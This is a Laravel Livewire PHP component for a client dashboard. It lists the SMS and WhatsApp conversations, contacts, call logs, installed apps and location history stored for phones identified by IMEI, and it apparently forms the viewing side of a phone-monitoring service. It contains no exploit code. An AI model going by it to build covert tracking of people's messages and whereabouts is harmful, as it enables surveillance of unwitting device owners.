<?php

namespace App\Http\Livewire\Client;

use Livewire\Component;
use Auth;
use App\Models\Contact;
use App\Models\ContactLog;
use App\Models\Sms;
use App\Models\SocialApp;
use App\Models\App;
use App\Models\Location;
use DB;

class Home extends Component
{
    public $phoneImei;
    public $menu;
    public $subMenu;

    // data
    public $smsList = [];
    public $smsConversationList = [];
    public $selectedSmsConversation;

    public $appsList = [];
    public $contactList = [];
    public $callLogList = [];
    public $deviceList = [];
    public $locationList = [];

    public $whatsappList = [];
    public $whatsappConversationList = [];
    public $selectedWhatsappConversation;

    public function showWhatsapp() {
        $this->resetChoice();
        $this->menu = '7';
        $this->whatsappList = SocialApp::latest('date')->where(['imei'=>$this->phoneImei,'platform'=>'whatsapp'])->get()->unique('contact');
        $this->selectedWhatsappConversation = $this->whatsappList->toArray()[0]["contact"];
        $this->whatsappConversationList = SocialApp::where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $this->selectedWhatsappConversation])->get();

    }
    public function showWhatsappConversation($contact) {
        $this->selectedWhatsappConversation = $contact;
        $this->whatsappConversationList = SocialApp::where(['imei'=>$this->phoneImei,'platform'=>'whatsapp','contact'=> $contact])->get();
    }
    public function showSms() {
        $this->resetChoice();
        $this->menu = '1';
        $this->smsList = Sms::latest('date')->where('imei',$this->phoneImei)->get()->unique('contact');
        $this->selectedSmsConversation = $this->smsList->toArray()[0]["contact"];
        $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
    }
    public function showSmsConversation($contact) {
        $this->selectedSmsConversation = $contact;
        $this->smsConversationList = Sms::where(['imei'=>$this->phoneImei,'contact'=>$this->selectedSmsConversation])->get();
    }
    public function showTwitter() {
        $this->resetChoice();
    }
    public function showContacts() {
        $this->resetChoice();
        $this->menu = '2';
        $this->contactList = Contact::where('imei',$this->phoneImei)->get();
    }
    public function showCallLogs() {
        $this->resetChoice();
        $this->menu = '3';
        $this->callLogList = ContactLog::where('imei',$this->phoneImei)->orderBy("date","DESC")->get();
    }
    public function showDashboard() {
        // get all regquired adat from db
        $this->resetChoice();
        $this->menu = '0';
    }
    public function showApps() {
        $this->resetChoice();
        $this->menu = '4';
        $this->appsList = App::where('imei',$this->phoneImei)->get();
    }
    public function showLocation() {
        $this->resetChoice();
        $this->menu = '6';
        $this->locationList = Location::where('imei',$this->phoneImei)->pluck('latitude','longitude');
        // dd($this->locationList);
    }


    private function resetChoice() {

        //reset data entry
        $this->reset(['smsConversationList','whatsappConversationList','smsList','appsList','contactList','callLogList','deviceList','locationList','whatsappList']);
    }

    public function render()
    {
        $tokens = Auth::user()->mobileAccessToken;
        $tmphones = [];
        foreach($tokens as $token){
            array_push($tmphones,$token->phone);
        }
 
        return view('livewire.client.home',[
            'phones' => $tmphones,
        ]);
    }
}
